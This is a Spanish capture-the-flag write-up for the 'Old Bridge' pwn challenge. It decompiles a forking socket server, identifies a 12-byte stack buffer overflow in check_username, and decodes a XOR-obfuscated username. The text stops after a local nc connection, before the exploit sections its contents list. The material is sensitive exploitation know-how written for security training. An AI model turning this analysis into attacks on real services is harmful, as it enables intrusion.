<!doctype html><html lang="es"><head><title>Old Bridge | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. _Buffer Overflow_. Fuerza bruta. _Stack Pivot_. Ret2Libc"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. _Buffer Overflow_. Fuerza bruta. _Stack Pivot_. Ret2Libc"><meta itemprop="keywords" content><meta itemprop="name" content="Old Bridge"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. _Buffer Overflow_. Fuerza bruta. _Stack Pivot_. Ret2Libc"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Old Bridge"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. _Buffer Overflow_. Fuerza bruta. _Stack Pivot_. Ret2Libc"><meta name="twitter:description" content="Binario de 64 bits. _Buffer Overflow_. Fuerza bruta. _Stack Pivot_. Ret2Libc"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Old Bridge"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/old-bridge/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/&amp;text=Old%20Bridge" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/old-bridge/&amp;title=Old%20Bridge" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Old Bridge</h1><p class="mb4 f6 dib tracked">17 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#ataque-de-fuerza-bruta">Ataque de fuerza bruta</a></li><li><a href="#_bypass_-de-pie"><em>Bypass</em> de PIE</a></li><li><a href="#_stack-pivot_"><em>Stack Pivot</em></a></li><li><a href="#fugando-direcciones-de-glibc">Fugando direcciones de Glibc</a></li><li><a href="#obteniendo-rce">Obteniendo RCE</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>oldbridge</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>Tenemos casi todas las protecciones habilitadas, por lo que debemos realizar varios <em>bypasses</em> para explotar el binario.</p><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Como en la mayoría de los retos de explotación de binarios, debemos hacer un paso de ingeniería inversa para obtener las instrucciones de ensamblador o el código fuente en C del binario para determinar qué está haciendo y cómo podemos explotarlo.</p><p>Esta es la función <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">,</span> <span class="mtk1">undefined8</span> <span class="mtk5">*</span><span class="mtk9 mtki">param_2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">in_FS_OFFSET;</span>
  <span class="mtk7 mtki">socklen_t</span> <span class="mtk1">local_50;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_4c;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_48;</span>
  <span class="mtk1">undefined4</span> <span class="mtk1">local_44;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_40;</span>
  <span class="mtk7 mtki">__pid_t</span> <span class="mtk1">local_3c;</span>
  <span class="mtk1">undefined</span> <span class="mtk1">local_38[</span><span class="mtk6">4</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">uint32_t</span> <span class="mtk1">local_34;</span>
  <span class="mtk1">sockaddr</span> <span class="mtk1">local_28;</span>
  <span class="mtk1">undefined8</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">(undefined8</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
  <span class="mtk1">local_4c</span> <span class="mtk5">=</span> <span class="mtk6">1</span><span class="mtk1">;</span>

  <span class="mtk5">if</span> <span class="mtk1">(param_1</span> <span class="mtk5">!=</span> <span class="mtk6">2</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"usage:</span> <span class="mtk6">%s</span> <span class="mtk4">&lt;port&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">*</span><span class="mtk1">param_2);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">local_48</span> <span class="mtk5">=</span> <span class="mtk8">atoi</span><span class="mtk1">((</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">param_2[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
  <span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk1">exit_server);</span>
  <span class="mtk1">server_sd</span> <span class="mtk5">=</span> <span class="mtk8">socket</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(server_sd</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"socket"</span><span class="mtk1">);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">setsockopt</span><span class="mtk1">(server_sd,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_4c,</span> <span class="mtk6">4</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"setsockopt"</span><span class="mtk1">);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">local_38._0_2_</span> <span class="mtk5">=</span> <span class="mtk6">2</span><span class="mtk1">;</span>
  <span class="mtk1">local_34</span> <span class="mtk5">=</span> <span class="mtk8">htonl</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
  <span class="mtk1">local_38._2_2_</span> <span class="mtk5">=</span> <span class="mtk8">htons</span><span class="mtk1">((</span><span class="mtk7 mtki">uint16_t</span><span class="mtk1">)</span> <span class="mtk1">local_48);</span>
  <span class="mtk1">local_44</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">bind</span><span class="mtk1">(server_sd,</span> <span class="mtk1">(sockaddr</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">local_38,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"bind"</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">listen</span><span class="mtk1">(server_sd,</span> <span class="mtk6">5</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"listen"</span><span class="mtk1">);</span>
    <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">__sighandler_t</span><span class="mtk1">)</span> <span class="mtk5">0x</span><span class="mtk6">1</span><span class="mtk1">);</span>
  <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk1">local_50</span> <span class="mtk5">=</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">;</span>
    <span class="mtk1">local_40</span> <span class="mtk5">=</span> <span class="mtk8">accept</span><span class="mtk1">(server_sd,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_28,</span> <span class="mtk5">&amp;</span><span class="mtk1">local_50);</span>  

    <span class="mtk5">if</span> <span class="mtk1">(local_40</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"accept"</span><span class="mtk1">);</span>
      <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
      <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>

    <span class="mtk1">local_3c</span> <span class="mtk5">=</span> <span class="mtk8">fork</span><span class="mtk1">();</span>

    <span class="mtk5">if</span> <span class="mtk1">(local_3c</span> <span class="mtk5">&lt;</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>

    <span class="mtk5">if</span> <span class="mtk1">(local_3c</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
      <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">check_username</span><span class="mtk1">();</span>

      <span class="mtk5">if</span> <span class="mtk1">(iVar1</span> <span class="mtk5">!=</span> <span class="mtk6">0</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk8">write</span><span class="mtk1">(local_40,</span> <span class="mtk4">"Username</span> <span class="mtk4">found!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">);</span>
      <span class="mtk1">}</span>

      <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
      <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
    <span class="mtk1">}</span>

    <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
  <span class="mtk1">}</span>

  <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"fork"</span><span class="mtk1">);</span>
  <span class="mtk8">close</span><span class="mtk1">(local_40);</span>
  <span class="mtk8">close</span><span class="mtk1">(server_sd);</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
  <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><p>Simplemente inicia un servidor de <em>sockets</em> y llama a <code>fork</code> cada vez que llega una nueva conexión. Este hecho será importante para la explotación.</p><p>Luego, llama a <code>check_username</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">bool</span> <span class="mtk8">check_username</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span> <span class="mtk9 mtki">param_1</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">iVar1;</span>
  <span class="mtk7 mtki">ssize_t</span> <span class="mtk1">sVar2;</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">in_FS_OFFSET;</span>
  <span class="mtk7 mtki">int</span> <span class="mtk1">local_420;</span>
  <span class="mtk1">byte</span> <span class="mtk1">local_418[</span><span class="mtk6">1032</span><span class="mtk1">];</span>
  <span class="mtk7 mtki">long</span> <span class="mtk1">local_10;</span>

  <span class="mtk1">local_10</span> <span class="mtk5">=</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk1">(in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
  <span class="mtk8">write</span><span class="mtk1">(param_1,</span> <span class="mtk4">"Username:</span> <span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk6">10</span><span class="mtk1">);</span>
  <span class="mtk1">sVar2</span> <span class="mtk5">=</span> <span class="mtk8">read</span><span class="mtk1">(param_1,</span> <span class="mtk1">local_418,</span> <span class="mtk5">0x</span><span class="mtk6">420</span><span class="mtk1">);</span>

  <span class="mtk5">for</span> <span class="mtk1">(local_420</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span> <span class="mtk1">local_420</span> <span class="mtk5">&lt;</span> <span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1">)</span> <span class="mtk1">sVar2;</span> <span class="mtk1">local_420</span> <span class="mtk5">=</span> <span class="mtk1">local_420</span> <span class="mtk5">+</span> <span class="mtk6">1</span><span class="mtk1">)</span> <span class="mtk1">{</span>  
    <span class="mtk1">local_418[local_420]</span> <span class="mtk5">=</span> <span class="mtk1">local_418[local_420]</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">d</span><span class="mtk1">;</span>
  <span class="mtk1">}</span>

  <span class="mtk1">iVar1</span> <span class="mtk5">=</span> <span class="mtk8">memcmp</span><span class="mtk1">(local_418,</span> <span class="mtk4">"il{dih"</span><span class="mtk1">,</span> <span class="mtk6">6</span><span class="mtk1">);</span>

  <span class="mtk5">if</span> <span class="mtk1">(local_10</span> <span class="mtk5">!=</span> <span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span> <span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET</span> <span class="mtk5">+</span> <span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">))</span> <span class="mtk1">{</span>
                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
    <span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
  <span class="mtk1">}</span>

  <span class="mtk5">return</span> <span class="mtk1">iVar1</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="vulnerabilidad-de-_buffer-overflow_">Vulnerabilidad de <em>Buffer Overflow</em></h3><p>Aquí tenemos una vulnerabilidad de <em>Buffer Overflow</em> porque la variable <code>local_418</code> tiene asignados 1032 bytes y <code>read</code> copia <code>0x420</code> = 1044 bytes en <code>local_418</code>, desbordando el <em>buffer</em> reservado en 12 bytes.</p><p>Otra cosa a notar es que los datos de entrada se están cifrando con XOR y clave <code>0xd</code>. Finalmente, se compara con <code>"il{dih "</code>. Podemos deshacer el cifrado de la siguiente manera:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; bytes([c ^ 0xd for c in b'il{dih']).decode()  
'davide'
</code></pre></div><p>En este punto, tenemos el nombre de usuario esperado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 127.0.0.1 1234  
Username: davide
